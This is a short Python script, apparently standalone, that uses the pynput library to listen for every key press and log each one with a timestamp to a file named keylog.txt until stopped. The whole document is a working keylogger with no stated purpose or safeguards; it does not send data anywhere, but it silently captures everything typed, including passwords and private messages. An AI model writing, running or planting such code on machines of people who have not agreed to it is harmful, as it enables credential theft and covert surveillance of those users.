from pynput.keyboard import Key, Listener
import logging

log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"{key}")

with Listener(on_press=on_press) as listener:
    listener.join()
